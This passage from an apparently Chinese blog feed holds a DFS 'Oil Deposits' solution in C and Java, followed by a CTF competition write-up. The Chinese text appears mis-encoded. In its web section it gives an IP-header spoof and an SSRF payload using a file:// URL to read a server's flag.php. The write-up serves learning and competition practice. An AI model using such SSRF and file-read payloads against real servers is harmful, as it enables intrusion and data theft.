punctuation">}</span>        <span class="token keyword">for</span><span class="token punctuation">(</span>i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span>m<span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token keyword">for</span><span class="token punctuation">(</span>j<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>j<span class="token operator">&lt;</span>n<span class="token punctuation">;</span>j<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span>                <span class="token keyword">if</span><span class="token punctuation">(</span>map<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token operator">==</span><span class="token string">'@'</span><span class="token punctuation">)</span><span class="token punctuation">{</span>                    <span class="token function">dfs</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span>j<span class="token punctuation">)</span><span class="token punctuation">;</span>                    flag <span class="token operator">=</span> flag <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span>                <span class="token punctuation">}</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%d\n"</span><span class="token punctuation">,</span>flag<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">//ÂÆö‰πâÊ∑±Â∫¶‰ºòÂÖàÊêúÁ¥¢</span><span class="token keyword">int</span> <span class="token function">dfs</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token punctuation">,</span><span class="token keyword">int</span> j<span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">//Ë∑ü‰∏™Êâ´Êèè‰ª™‰ººÁöÑÔºåÈÄíÂΩíÊêúÁ¥¢</span>    <span class="token comment" spellcheck="true">//Â¶ÇÊûú‰∏ç‰∏∫@ÊàñËÄÖË∂ÖÂá∫ËåÉÂõ¥ÔºåÂàôÂÅúÊ≠¢ËØ•ÊñπÂêëÊêúÁ¥¢</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>map<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token operator">!=</span><span class="token string">'@'</span><span class="token operator">||</span>i<span class="token operator">&lt;</span><span class="token number">0</span><span class="token operator">||</span>j<span class="token operator">&lt;</span><span class="token number">0</span><span class="token operator">||</span>i<span class="token operator">></span>m<span class="token operator">||</span>j<span class="token operator">></span>n<span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">//ÂêëÂÖ´‰∏™ÊñπÂêëËøõË°åÁªßÁª≠ÊêúÁ¥¢</span>    <span class="token keyword">else</span><span class="token punctuation">{</span>        <span class="token comment" spellcheck="true">//Ê†πÊçÆdfsÁöÑÁâπÁÇπÔºåËÆøÈóÆËøáÁöÑÈ°∂ÁÇπÈúÄË¶ÅÊ†áËÆ∞(ËøôÈáåÁΩÆ‰∏∫*)ÔºåÈò≤Ê≠¢ÈáçÂ§çÈÄíÂΩíÁàÜÁÇ∏</span>        map<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token operator">=</span><span class="token string">'*'</span><span class="token punctuation">;</span>            <span class="token function">dfs</span><span class="token punctuation">(</span>i<span class="token number">-1</span><span class="token punctuation">,</span>j<span class="token number">-1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">dfs</span><span class="token punctuation">(</span>i<span class="token number">-1</span><span class="token punctuation">,</span>j<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">dfs</span><span class="token punctuation">(</span>i<span class="token number">-1</span><span class="token punctuation">,</span>j<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">dfs</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span>j<span class="token number">-1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">dfs</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span>j<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">dfs</span><span class="token punctuation">(</span>i<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">,</span>j<span class="token number">-1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">dfs</span><span class="token punctuation">(</span>i<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">,</span>j<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">dfs</span><span class="token punctuation">(</span>i<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">,</span>j<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>javaÈáçÊûÑÁâà:</p><pre class=" language-java"><code class="language-java"><span class="token keyword">import</span> java<span class="token punctuation">.</span>io<span class="token punctuation">.</span>BufferedInputStream<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>Scanner<span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">DFS_Oil_Deposits</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">int</span> <span class="token function">dfs</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token punctuation">,</span> <span class="token keyword">int</span> j<span class="token punctuation">,</span> <span class="token keyword">char</span> map<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token keyword">int</span> m<span class="token punctuation">,</span> <span class="token keyword">int</span> n<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token comment" spellcheck="true">//Ê≥®ÊÑèËøôÈáåÂõ†‰∏∫ÊòØÂä®ÊÄÅÁî≥ËØ∑Êï∞ÁªÑÔºå‰∏éC++‰∏çÂêåÔºåÂ¶ÇÊûú‰∏çÂÖàÂà§Êñ≠Â•ΩÂèÇÊï∞Â§ßÂ∞èÔºå‰ºöÂØºËá¥Êï∞ÁªÑË∂äÁïåÁöÑÈóÆÈ¢ò</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span> i <span class="token operator">&lt;</span> <span class="token number">0</span> <span class="token operator">||</span> j <span class="token operator">&lt;</span> <span class="token number">0</span> <span class="token operator">||</span>i <span class="token operator">>=</span> m <span class="token operator">||</span> j <span class="token operator">>=</span> n <span class="token operator">||</span> map<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">'*'</span> <span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">//ÂêëÂÖ´‰∏™ÊñπÂêëËøõË°åÁªßÁª≠ÊêúÁ¥¢</span>        <span class="token keyword">else</span> <span class="token punctuation">{</span>            <span class="token comment" spellcheck="true">//Ê†πÊçÆdfsÁöÑÁâπÁÇπÔºåËÆøÈóÆËøáÁöÑÈ°∂ÁÇπÈúÄË¶ÅÊ†áËÆ∞(ËøôÈáåÁΩÆ‰∏∫*)ÔºåÈò≤Ê≠¢ÈáçÂ§çÈÄíÂΩíÁàÜÁÇ∏</span>            map<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'*'</span><span class="token punctuation">;</span>            <span class="token function">dfs</span><span class="token punctuation">(</span>i <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">,</span> j <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">,</span> map<span class="token punctuation">,</span> m<span class="token punctuation">,</span> n<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">dfs</span><span class="token punctuation">(</span>i <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">,</span> j<span class="token punctuation">,</span> map<span class="token punctuation">,</span> m<span class="token punctuation">,</span> n<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">dfs</span><span class="token punctuation">(</span>i <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">,</span> j <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span> map<span class="token punctuation">,</span> m<span class="token punctuation">,</span> n<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">dfs</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span> j <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">,</span> map<span class="token punctuation">,</span> m<span class="token punctuation">,</span> n<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">dfs</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span> j <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span> map<span class="token punctuation">,</span> m<span class="token punctuation">,</span> n<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">dfs</span><span class="token punctuation">(</span>i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span> j <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">,</span> map<span class="token punctuation">,</span> m<span class="token punctuation">,</span> n<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">dfs</span><span class="token punctuation">(</span>i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span> j<span class="token punctuation">,</span> map<span class="token punctuation">,</span> m<span class="token punctuation">,</span> n<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">dfs</span><span class="token punctuation">(</span>i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span> j <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span> map<span class="token punctuation">,</span> m<span class="token punctuation">,</span> n<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token comment" spellcheck="true">//ÂΩìÂÖÉÁ¥†ËøáÂ§öÊó†Ê≥ïÂàó‰∏æÊó∂ÔºåÂä®ÊÄÅÁî≥ËØ∑Êï∞ÁªÑ‰ª•‰∏ãÈù¢ËøôÁßçÊñπÂºè</span>        <span class="token keyword">char</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">]</span> map <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">char</span><span class="token punctuation">[</span><span class="token number">101</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">101</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">int</span> m <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> n <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>        <span class="token keyword">int</span> i<span class="token punctuation">,</span> j<span class="token punctuation">,</span> flag<span class="token punctuation">,</span> flag1 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">//Áî®ScannerÂÆö‰πâËæìÂÖ•</span>        Scanner cin <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Scanner</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">BufferedInputStream</span><span class="token punctuation">(</span>System<span class="token punctuation">.</span>in<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">//Áõ∏ÂΩì‰∫éc++‰∏≠ÁöÑEOFÂà§Êñ≠</span>        <span class="token keyword">while</span> <span class="token punctuation">(</span>cin<span class="token punctuation">.</span><span class="token function">hasNext</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            flag1 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>m <span class="token operator">!=</span> <span class="token number">0</span> <span class="token operator">||</span> n <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                m <span class="token operator">=</span> cin<span class="token punctuation">.</span><span class="token function">nextInt</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                n <span class="token operator">=</span> cin<span class="token punctuation">.</span><span class="token function">nextInt</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">for</span> <span class="token punctuation">(</span>flag <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> flag <span class="token operator">&lt;</span> m<span class="token punctuation">;</span> flag<span class="token operator">++</span><span class="token punctuation">)</span>                    map<span class="token punctuation">[</span>flag<span class="token punctuation">]</span> <span class="token operator">=</span> cin<span class="token punctuation">.</span><span class="token function">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toCharArray</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//                for (i = 0; i &lt; m; i++) {</span><span class="token comment" spellcheck="true">//                    for (j = 0; j &lt; n; j++) {</span><span class="token comment" spellcheck="true">//                        //map[i][j] = mapstrings[i][j];</span><span class="token comment" spellcheck="true">//                        System.out.print(map[i][j]);</span><span class="token comment" spellcheck="true">//                    }</span><span class="token comment" spellcheck="true">//                    System.out.print('\n');</span><span class="token comment" spellcheck="true">//                }</span><span class="token comment" spellcheck="true">//            }</span><span class="token comment" spellcheck="true">//</span><span class="token comment" spellcheck="true">//        }</span>                <span class="token keyword">for</span> <span class="token punctuation">(</span>i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> m<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                    <span class="token keyword">for</span> <span class="token punctuation">(</span>j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> j <span class="token operator">&lt;</span> n<span class="token punctuation">;</span> j<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                        <span class="token keyword">if</span> <span class="token punctuation">(</span>map<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">'@'</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                            <span class="token function">dfs</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span> j<span class="token punctuation">,</span> map<span class="token punctuation">,</span> m<span class="token punctuation">,</span> n<span class="token punctuation">)</span><span class="token punctuation">;</span>                            flag1 <span class="token operator">=</span> flag1 <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span>                        <span class="token punctuation">}</span>                    <span class="token punctuation">}</span>                <span class="token punctuation">}</span>                System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>flag1<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><blockquote><p>ÂÖ∂ÂÆûÊòØÈ°∫‰æøÁªÉ‰π†‰∏Ä‰∏ãjavaÔºåc++ÂíåjavaÊúâÊØîËæÉÂ§öÁõ∏‰ºº‰πãÂ§ÑÔºå‰ΩÜÊòØ‰πüÊúâ‰∏Ä‰∫õ‰∏çÂêåÁöÑÂú∞ÊñπÔºåÊâÄ‰ª•ÈúÄË¶ÅÂ•ΩÂ•ΩÊ≥®ÊÑè„ÄÇ</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> ÁÆóÊ≥ï </category>
          
      </categories>
      
      
        <tags>
            
            <tag> DFS </tag>
            
            <tag> algorithm </tag>
            
            <tag> ÁÆóÊ≥ï </tag>
            
            <tag> coding </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Á¨¨ÂõõÂ±äÂÖ®ÂõΩÈÇÄËØ∑Ëµõ_ËµõÂêéÂ∞èÁªì</title>
      <link href="/2018/11/06/%E7%AC%AC%E5%9B%9B%E5%B1%8A%E4%B8%8A%E6%B5%B7%E7%BD%91%E5%AE%89%E6%9A%A8%E5%85%A8%E5%9B%BD%E9%82%80%E8%AF%B7%E8%B5%9B-%E8%B5%9B%E5%90%8E%E5%B0%8F%E7%BB%93/"/>
      <url>/2018/11/06/%E7%AC%AC%E5%9B%9B%E5%B1%8A%E4%B8%8A%E6%B5%B7%E7%BD%91%E5%AE%89%E6%9A%A8%E5%85%A8%E5%9B%BD%E9%82%80%E8%AF%B7%E8%B5%9B-%E8%B5%9B%E5%90%8E%E5%B0%8F%E7%BB%93/</url>
      
        <content type="html"><![CDATA[<p>‚Ä¶‚Ä¶</p><a id="more"></a><h1 id="Á¨¨ÂõõÂ±ä‰∏äÊµ∑ÁΩëÂÆâÊö®ÂÖ®ÂõΩÈÇÄËØ∑Ëµõ-ËµõÂêéÂ∞èÁªì"><a href="#Á¨¨ÂõõÂ±ä‰∏äÊµ∑ÁΩëÂÆâÊö®ÂÖ®ÂõΩÈÇÄËØ∑Ëµõ-ËµõÂêéÂ∞èÁªì" class="headerlink" title="Á¨¨ÂõõÂ±ä‰∏äÊµ∑ÁΩëÂÆâÊö®ÂÖ®ÂõΩÈÇÄËØ∑Ëµõ_ËµõÂêéÂ∞èÁªì"></a>Á¨¨ÂõõÂ±ä‰∏äÊµ∑ÁΩëÂÆâÊö®ÂÖ®ÂõΩÈÇÄËØ∑Ëµõ_ËµõÂêéÂ∞èÁªì</h1><blockquote><p>ÊâìÂÆåËøô‰∏™Á¨¨ÂõõÂ±ä‰∏äÊµ∑Â§ßÂ≠¶ÁîüÁΩëÁªúÂÆâÂÖ®Á´ûËµõÂêéÔºåÁÆÄÂçïÂÅö‰∏™Â∞èÁªìÔºåÂ∑©Âõ∫‰∏Ä‰∏ãüò≠„ÄÇ</p></blockquote><h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><h3 id="Á≠æÂà∞BASE32"><a href="#Á≠æÂà∞BASE32" class="headerlink" title="Á≠æÂà∞BASE32"></a>Á≠æÂà∞BASE32</h3><blockquote><p>Á¨¨‰∏ÄÈÅìÈ¢òÊòØBASE32ÔºåÁ≠æÂà∞È¢òÔºåÈ£òËøá„ÄÇ</p></blockquote><h3 id="pycÂèçÁºñËØë"><a href="#pycÂèçÁºñËØë" class="headerlink" title="pycÂèçÁºñËØë"></a>pycÂèçÁºñËØë</h3><blockquote><p>Á¨¨‰∫åÈ¢òÊòØpythonÁöÑÂèçÁºñËØëÔºå‰∏Ä‰∏™pycÊñá‰ª∂„ÄÇ</p><p>ÂèØËÉΩÊàëÊòØÁ¢∞Â∑ßÂÅöÂá∫Êù•ÁöÑÔºåÈÄöËøáimportÂØºÂåÖÔºàimportÊòØ‰∏™Â•Ω‰∏úË•øÔºåpycÈÉΩËÉΩÂØºÔºâÔºåÂèØ‰ª•ÂæóÂà∞‰∏Ä‰∏™ÂàóË°®<code>[0,10,7,1,29,14,7,22,22,31,57,30,9,52,27]</code>ÔºåÊåâÂàóË°®È°∫Â∫è‰æùÊ¨°ÂØπ‚Äùf‚Äù,‚Äùl‚Äù,‚Äùa‚Äù,‚Äùg‚Äù,ÂºÇÊàñÂèØ‰ª•ÂæóÂà∞keyÂÄº‰∏∫102ÔºåÁÑ∂ÂêéÂØπÂàóË°®ËøõË°åÂºÇÊàñÊìç‰ΩúÂèØ‰ª•ÂæóÂà∞flag„ÄÇ</p><p>‰ΩÜÊòØÂ§ß‰Ω¨‰ª¨ÊòØÊÄé‰πàÂéªÂÅöËøôÈ¢òÁöÑÂë¢ÔºöÂèëÁé∞pycÊñá‰ª∂‰∏≠ÊúâÊÅ∂ÊÑèÊèíÂÖ•ÁöÑ‰∏ÄË°åÂ≠óËäÇÁ†ÅÔºåÊ≠£ÊòØÂõ†‰∏∫Ëøô‰∏™ÔºåÂØºËá¥pycÊó†Ê≥ïË¢´ÂèçÁºñËØëÔºåÂà†Èô§‰πãÂêéÂèçÁºñËØëÂèØ‰ª•ÂæóÂà∞Ôºö</p><pre class=" language-assembly"><code class="language-assembly">1       0  JUMP_ABSOLUTE         6  'to 6'           3             6  JUMP_ABSOLUTE         9  'to 9'           9  LOAD_CONST            0  ''          12  LOAD_CONST            1  10          15  LOAD_CONST            2  7          18  LOAD_CONST            3  1          21  LOAD_CONST            4  29          24  LOAD_CONST            5  14          27  LOAD_CONST            2  7          30  LOAD_CONST            6  22          33  LOAD_CONST            6  22          36  LOAD_CONST            7  31          39  LOAD_CONST            8  57          42  LOAD_CONST            9  30          45  LOAD_CONST           10  9          48  LOAD_CONST           11  52   2      51  LOAD_CONST           12  27          54  BUILD_LIST_15        15          57  STORE_NAME            0  'cmp'   3      60  LOAD_NAME             1  'raw_input'          63  CALL_FUNCTION_0       0   4      66  STORE_NAME            2  'flag'          69  LOAD_CONST            0  ''          72  STORE_NAME            3  'm'          75  SETUP_LOOP           91  'to 169'          78  LOAD_NAME             2  'flag'          81  GET_ITER          82  FOR_ITER             83  'to 168'          85  STORE_NAME            4  'i'          88  LOAD_NAME             5  'ord'          91  LOAD_NAME             4  'i'          94  CALL_FUNCTION_1       1          97  UNARY_INVERT          98  LOAD_CONST           13  102         101  BINARY_AND         102  LOAD_NAME             5  'ord'         105  LOAD_NAME             4  'i'         108  CALL_FUNCTION_1       1         111  LOAD_CONST           18  -103         114  BINARY_AND         115  BINARY_OR         116  STORE_NAME            4  'i'         119  LOAD_NAME             4  'i'         122  LOAD_NAME             0  'cmp'         125  LOAD_NAME             3  'm'         128  BINARY_SUBSCR         129  COMPARE_OP            2  '=='         132  POP_JUMP_IF_FALSE   144  'to 144'         135  LOAD_NAME             3  'm'   8     138  UNARY_NEGATIVE         139  LOAD_CONST           14  -1         142  BINARY_ADD         143  UNARY_NEGATIVE  10     144  STORE_NAME            3  'm'         147  JUMP_BACK            73  'to 73'         150  CONTINUE             73  'to 73'         153  LOAD_CONST           15  'wrong'         156  PRINT_ITEM         157  PRINT_NEWLINE_CONT         158  LOAD_NAME             6  'exit'         161  CALL_FUNCTION_0       0         164  POP_TOP         165  JUMP_BACK            73  'to 73'         168  POP_BLOCK       169_0  COME_FROM                '75'         169  LOAD_CONST           16  'right'         172  PRINT_ITEM         173  PRINT_NEWLINE_CONT</code></pre><p>ÂàÜÊûêÊ∏ÖÊ•öÈÄªËæë‰πãÂêéÂèØ‰ª•ÈÄÜÂá∫flag„ÄÇ</p></blockquote><h3 id="N0find"><a href="#N0find" class="headerlink" title="N0find"></a>N0find</h3><blockquote><p>Â§ßÊùÇÁÉ©ÔºåÈ¶ñÂÖàÈÄöËøáwiresharkÊèêÂèñÂá∫‰∏§Âº†ÂõæÁâáÔºàÂÆûÈôÖ‰∏äÊï∞ÊçÆÂåÖ‰∏≠ËøòËóèÁùÄ‰∏Ä‰∫õ‰∏ç‰∏∫‰∫∫Áü•ÁöÑ‰∏úË•øÔºâÔºåÂÖ∂‰∏≠‰∏ÄÂº†ÊòØÂÖ≥ÈîÆÔºö</p><p><img src="https://raw.githubusercontent.com/Yof3ng/images/master/img/ctfisfun.jpeg" alt=""></p><p>ÂèØ‰ª•ÁúãÂà∞Êúâ‰∏™<code>ct??????</code>ÔºåËé´ÈùûÊòØctf‰ªÄ‰πàÁöÑÔºåÂÖ≠‰∏™ÈóÆÂè∑ÔºåÂÖ´‰Ωç„ÄÇÔºàÂêéÈù¢ÂÆòÊñπÁªôÂá∫ÊèêÁ§∫ÔºåopenbuffÔºàÊüê‰∏Ä‰∏çÁü•ÈÅìÂì™‰∏™ËßíËêΩÁöÑÈöêÂÜôËΩØ‰ª∂ÔºâÔºåcrcÁ¢∞ÊíûÔºå‰ª•ÂèäÁ¢∞ÊíûÂá∫Êù•ÁöÑÂÄº‰∏≠Âê´ÊúâfÔºâ„ÄÇ</p><p>Ëøô‰∏™Êó∂ÂÄôÂ∞±ÊáµÈÄº‰∫ÜÔºåÊãø‰ªÄ‰πàÂéªcrcÁ¢∞ÊíûÔºåÁ¢∞ÊíûÂÆåÂèàËÉΩÂπ≤Âï•Ôºü</p><p>‰ªîÁªÜÁúãÁúãÊï∞ÊçÆÂåÖ‰∏≠ÔºåÂá∫Áé∞‰∫ÜcrcÂ≠óÁúºÔºåÂπ∂‰∏îÂê´Êúâ3‰∏™Áñë‰ººcrcÁöÑÂÄºÔºö</p><p><code>C61B1F65</code>,<code>E74E142D</code>,<code>648BDAD5</code></p><p>ÊãøcrcÁ¢∞ÊíûËÑöÊú¨ËøõË°åÁ¢∞ÊíûÂæóÂà∞‰∏âÁªÑ‰∏≠ÊØèÁªÑÂê´ÊúâfÁöÑÂÄºÔºö</p><p>1.<code>93fjhl    fBWjIv</code></p><p>2.<code>mbof3k      Xez1fW</code></p><p>3.<code>v4gfx1    5fyJIo</code></p><p>ÁÑ∂ÂêéÊãøopenbuffËøõË°åËß£ÂØÜÔºåÈúÄË¶Å‰∏â‰∏™ÂØÜÈí•Ôºå‰πüÂ∞±ÊòØ‰∏äÈù¢‰∏âÁªÑËøõË°åÊéíÂàóÁªÑÂêàÔºåËÄå‰∏îÂºÄÂ§¥ËøòÈúÄË¶ÅÂä†‰∏äctÔºåÂç≥ÂèØgetflag„ÄÇ</p></blockquote><h3 id="92"><a href="#92" class="headerlink" title="92"></a>92</h3><blockquote><p>emmmÊ≤°Âï•Â•ΩËØ¥ÁöÑÔºåËÄÉÁÇπÂ∞±ÊòØÂ≠óÁ¨¶‰∏≤ÂèçËΩ¨Ôºå‰ª•ÂèäÂØπÂ≠óÁ¨¶ÁöÑÊïèÊÑüÊÄßÔºåËøòÊúâÂØπbase92ÁöÑ‰∫ÜËß£ÔºåÈ¢òÁõÆÁªôÂá∫‰∫Ü92Âü∫Êú¨‰∏äÂèØ‰ª•Áü•ÈÅìbase92ËøôÁé©ÊÑèÂÑø‰∫ÜÔºåÂêéÈù¢ÁöÑÈöæÂ∫¶‰∏çÊòØÁâπÂà´Â§ßÔºåÈúÄË¶Å‰∏ÄÂÆöÁöÑÁÅµÊ¥ªÊÄß„ÄÇ</p></blockquote><h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><blockquote><p>ËøôÊ¨°ÁöÑwebÊÑüËßâÂÖ®ÊòØphpÔºåÊØîËæÉ‚ÄùÁ°¨Ê†∏‚Äù„ÄÇ</p></blockquote><h3 id="web1"><a href="#web1" class="headerlink" title="web1"></a>web1</h3><blockquote><p>ÈÄöËøápost ‰º†admin=1Âπ∂‰∏îÁî®x-client-ip‰º™ÈÄ†Êú¨Âú∞ipÔºåÂç≥ÂèØÂà∞ËææÁî®urlÊâìssrfÁöÑÂú∞Ê≠•ÔºåÈÄöËøáÊåáÂÆöurlÔºåÊâìÂà∞ÁöÑÂÜÖÂÆπ‰ºö‰ª•ÂõæÁâáÊ†ºÂºèÂ≠òÂÇ®Âà∞downloadÁõÆÂΩï„ÄÇ</p><p>ËøôÈáåÈúÄË¶ÅÁî® fileÂçèËÆÆÔºåËÄå‰∏çÊòØhttpÂçèËÆÆ„ÄÇ</p><p>Â§ß‰Ω¨ÊòØËøôÊ†∑ÊûÑÈÄ†urlÁöÑÔºö</p><p><code>url=file://@127.0.0.1:80@www.ichunqiu.com/./..//var/www/html/flag.php</code></p><p>ËÄåÊàëÔºö</p><p><code>url=file://www.ichunqiu.com/var/www/html/flag.php</code></p><p>ÂèØËÉΩÂèàÊòØÁ¢∞Â∑ßÊâìÂà∞ÁöÑÔºüÊàë‰ª¨ÂèØ‰ª•Ëé∑Âæósource.phpÁöÑÊ∫êÁ†ÅÔºö</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">include</span> <span class="token string">"flag.php"</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string">"you need to login as admin!"</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string">"&lt;!-- post param  'admin' -->"</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'admin'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'admin'</span><span class="token punctuation">]</span><span class="token operator">==</span><span class="token number">1</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string">'HTTP_X_CLIENT_IP'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'url'</span><span class="token 